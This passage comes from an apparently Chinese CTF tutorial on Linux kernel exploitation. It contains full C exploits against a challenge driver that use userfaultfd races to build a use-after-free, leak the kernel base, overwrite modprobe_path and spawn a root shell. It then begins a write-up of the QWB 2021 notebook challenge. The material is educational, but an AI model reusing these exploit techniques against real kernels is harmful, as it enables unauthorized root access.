/shell.sh&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /shell.sh&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;chmod +x /shell.sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    chunk_add(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(page, &amp;modprobe_path, <span class="number">8</span>);</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] FAILED to fork the child&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Child process sleeping now...&quot;</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Child process started.&quot;</span>);</span><br><span class="line">        chunk_del(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] UAF constructed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Parent process trapped in userfaultfd...&quot;</span>);</span><br><span class="line">        chunk_edit(<span class="number">0</span>, buf2);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijack finished&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    chunk_add(<span class="number">0x100</span>);</span><br><span class="line">    chunk_add(<span class="number">0x100</span>);</span><br><span class="line">    chunk_edit(<span class="number">1</span>, <span class="string">&quot;/shell.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/fake&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (open(<span class="string">&quot;/flag&quot;</span>, O_RDWR) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;FAILED to hijack!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] hijack success&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>上面这种方法构造 Race condition 需要 sleep
效率较低，即使保存泄露的基址避免重复爆破依然需要长时间爆破。
不难想到，可以将子线程的逻辑写到 userfaule_fd
的处理函数中，因为页错误发生和处理页错误的顺序是确定的，因此保证了 Race
condition 的顺序。这样就可以避免通过 sleep 时长来控制先后顺序。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0dad3035dbaa003f9c93fa2f80408936.png"
                     
alt="在这里插入图片描述" 
                ></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> TTY_STRUCT_SIZE = <span class="number">0x2C0</span>;</span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff8245c5c0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_kernel_text_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFFFFFF80000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFFFFFFEFFFFFF</span>;</span><br><span class="line"><span class="comment">//    return addr &gt;= 0xFFFFFFFF80000000 &amp;&amp; addr &lt;= 0xFFFFFFFF9FFFFFFF;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *page;</span><br><span class="line"><span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">void</span> *(*handler)(<span class="type">void</span> *))</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: userfaultfd&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span> =</span> &#123;.api=UFFD_API, .features=<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: pthread_create&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">size_t</span> size;</span><br><span class="line">        <span class="type">size_t</span> index;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">&#125; Chunk;</span><br><span class="line"><span class="type">long</span> knote_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_add</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    Chunk chunk = &#123;.size=size&#125;;</span><br><span class="line">    ioctl((<span class="type">int</span>) knote_fd, <span class="number">0x1337</span>, &amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_edit</span><span class="params">(<span class="type">size_t</span> index, <span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    Chunk chunk = &#123;.index=index, .buf=buf&#125;;</span><br><span class="line">    ioctl((<span class="type">int</span>) knote_fd, <span class="number">0x8888</span>, &amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_get</span><span class="params">(<span class="type">size_t</span> index, <span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    Chunk chunk = &#123;.index=index, .buf=buf&#125;;</span><br><span class="line">    ioctl((<span class="type">int</span>) knote_fd, <span class="number">0x2333</span>, &amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunk_del</span><span class="params">(<span class="type">size_t</span> index)</span> &#123;</span><br><span class="line">    Chunk chunk = &#123;.index=index&#125;;</span><br><span class="line">    ioctl((<span class="type">int</span>) knote_fd, <span class="number">0x6666</span>, &amp;chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = (<span class="type">long</span>) arg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = (<span class="type">int</span>) uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="type">int</span> nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: poll&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">        <span class="type">ssize_t</span> nread = read((<span class="type">int</span>) uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: EOF on userfaultfd!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Unexpected event on userfaultfd&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        chunk_del(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">        uffdio_copy.src = (<span class="type">size_t</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">size_t</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.src: %p\n&quot;</span>, uffdio_copy.src);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.dst: %p\n&quot;</span>, uffdio_copy.dst);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = (<span class="type">long</span>) arg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = (<span class="type">int</span>) uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="type">int</span> nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: poll&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">        <span class="type">ssize_t</span> nread = read((<span class="type">int</span>) uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: EOF on userfaultfd!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Unexpected event on userfaultfd&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        chunk_del(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(page, &amp;modprobe_path, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">        uffdio_copy.src = (<span class="type">size_t</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">size_t</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.src: %p\n&quot;</span>, uffdio_copy.src);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.dst: %p\n&quot;</span>, uffdio_copy.dst);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    page_size = getpagesize();</span><br><span class="line">    page = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    knote_fd = open(<span class="string">&quot;/dev/knote&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (knote_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open knote.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FILE *offset_fd = fopen(<span class="string">&quot;/offset&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset;</span><br><span class="line">    <span class="keyword">if</span> (offset_fd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(offset_fd, <span class="string">&quot;%llx&quot;</span>, &amp;kernel_offset);</span><br><span class="line">        fclose(offset_fd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">char</span> *buf = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        register_userfaultfd(buf, page_size, (<span class="type">void</span> *) leak_thread);</span><br><span class="line">        chunk_add(TTY_STRUCT_SIZE);</span><br><span class="line">        chunk_get(<span class="number">0</span>, buf);</span><br><span class="line">        qword_dump(<span class="string">&quot;leak tty_struct&quot;</span>,buf,TTY_STRUCT_SIZE);</span><br><span class="line">        <span class="keyword">if</span> (((<span class="type">size_t</span> *) buf)[<span class="number">86</span>]) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] Successfully hit the tty_struct.&quot;</span>);</span><br><span class="line">            kernel_offset = ((<span class="type">size_t</span> *) buf)[<span class="number">86</span>] - <span class="number">0xffffffff815d4ef0</span>;</span><br><span class="line">            offset_fd = fopen(<span class="string">&quot;/offset&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">            <span class="built_in">fprintf</span>(offset_fd, <span class="string">&quot;%llx&quot;</span>, kernel_offset);</span><br><span class="line">            fclose(offset_fd);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to hit the tty struct.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] modprobe_path: %p\n&quot;</span>, modprobe_path);</span><br><span class="line"></span><br><span class="line">    chunk_add(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(buf, page_size, (<span class="type">void</span> *) uaf_thread);</span><br><span class="line">    chunk_edit(<span class="number">0</span>, buf);</span><br><span class="line">    chunk_add(<span class="number">0x100</span>);</span><br><span class="line">    chunk_add(<span class="number">0x100</span>);</span><br><span class="line">    chunk_edit(<span class="number">1</span>, <span class="string">&quot;/shell.sh&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (open(<span class="string">&quot;/shell.sh&quot;</span>, O_RDWR) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt;&gt; /shell.sh&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /shell.sh&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;chmod +x /shell.sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/fake&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (open(<span class="string">&quot;/flag&quot;</span>, O_RDWR) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to hijack!&quot;</span>);</span><br><span class="line">        _exit(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] hijack success&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="例题强网杯2021-notebook">例题：强网杯2021 notebook</h3>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/qwb2021_notebook" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
题目中的 <code>notedel</code>
加了写锁，<code>noteadd</code>，<code>noteedit</code>
加了读锁。读锁可以被多个进程使用，多个进程此时可以同时进入临界区，而写锁只能被一个进程使用，只有一个进程能够进入临界区，因此只能考虑读锁的功能。</p>
<p><code>noteedit</code> 函数功能如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> newsize, <span class="type">void</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r13</span></span><br><span class="line">  note *note; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// r12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">-1LL</span>;</span><br><span class="line">    printk(<span class="string">&quot;[x] Edit idx out of range.\n&quot;</span>, newsize);</span><br><span class="line">    <span class="keyword">return</span> v8;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v3;</span><br><span class="line">  note = &amp;notebook[idx];</span><br><span class="line">  raw_read_lock(&amp;lock);</span><br><span class="line">  size = note-&gt;size;</span><br><span class="line">  note-&gt;size = newsize;</span><br><span class="line">  <span class="keyword">if</span> ( size == newsize )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> editout;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = krealloc(note-&gt;note, newsize, <span class="number">0x24000C0</span>LL);</span><br><span class="line">  copy_from_user(name, v4, <span class="number">0x100</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !note-&gt;size )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;free in fact&quot;</span>);</span><br><span class="line">    note-&gt;note = <span class="number">0LL</span>;</span><br><span class="line">    v8 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> editout;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)_virt_addr_valid(v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    note-&gt;note = (<span class="type">void</span> *)v7;</span><br><span class="line">    v8 = <span class="number">2LL</span>;</span><br><span class="line">editout:</span><br><span class="line">    raw_read_unlock(&amp;lock);</span><br><span class="line">    printk(<span class="string">&quot;[o] Edit success. %s edit a note.\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> v8;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(<span class="string">&quot;[x] Return ptr unvalid.\n&quot;</span>);</span><br><span class="line">  raw_read_unlock(&amp;lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以看到 <code>editnote</code> 实际上是利用 <code>krealloc</code>
改变 note 的大小 。<code>krealloc</code> 有如下特性：</p>
<ul>
<li><code>krealloc</code> 的 new_size&lt;ks
，则指针不变，仅调整kasan监控的区域 。</li>
<li><code>krealloc</code> 的 new_size&gt;ks ，则 <code>kfree</code>
释放原本 object ，<code>kmalloc</code> 重新申请新 object 。</li>
</ul>
<p>由于 <code>editnote</code> 是先 <code>realloc</code> 再
